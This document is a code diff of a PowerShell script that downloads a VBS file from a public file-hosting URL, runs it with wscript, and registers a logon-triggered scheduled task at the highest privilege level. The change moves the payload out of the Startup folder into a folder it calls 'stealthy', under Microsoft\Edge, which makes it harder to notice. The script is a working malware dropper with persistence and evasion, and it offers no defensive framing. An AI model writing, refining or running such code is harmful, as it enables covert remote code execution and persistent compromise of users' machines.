@@ -1,33 +1,30 @@
 # Define URL of the VBS file
 $url = "https://files.catbox.moe/eqlsi1.vbs"
 
-# Correct Startup folder path
-$startupFolder = Join-Path $env:APPDATA "Microsoft\Windows\Start Menu\Programs\Startup"
-$startupPath = Join-Path $startupFolder "eqlsi1.vbs"
+# Define a stealthy folder to store the file
+$destinationFolder = Join-Path $env:APPDATA "Microsoft\Edge"
+$destinationPath = Join-Path $destinationFolder "eqlsi1.vbs"
 
-# Create the Startup folder if it doesn't exist
-if (-not (Test-Path $startupFolder)) {
-    New-Item -ItemType Directory -Path $startupFolder | Out-Null
+# Create the folder if it doesn't exist
+if (-not (Test-Path $destinationFolder)) {
+    New-Item -ItemType Directory -Path $destinationFolder | Out-Null
 }
 
-# Download the VBS file to the Startup folder
-Invoke-WebRequest -Uri $url -OutFile $startupPath
+# Download the VBS file to the new location
+Invoke-WebRequest -Uri $url -OutFile $destinationPath
 
-# Optionally run it immediately
-Start-Process -FilePath "wscript.exe" -ArgumentList "`"$startupPath`"" -NoNewWindow
+# Optionally run the VBS immediately (for testing)
+Start-Process -FilePath "wscript.exe" -ArgumentList "`"$destinationPath`"" -NoNewWindow
 
 # === Scheduled Task Setup ===
 
-# Set the script path for scheduled task
-$scriptPath = $startupPath
+# Create the task action
+$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$destinationPath`""
 
-# Create the action
-$action = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$scriptPath`""
-
-# Trigger on user logon
+# Set trigger on user logon
 $trigger = New-ScheduledTaskTrigger -AtLogOn
 
-# Use current user with highest privileges
+# Set principal to current user with highest privileges
 $principal = New-ScheduledTaskPrincipal -UserId "$env:USERNAME" -LogonType Interactive -RunLevel Highest
 
 # Task settings
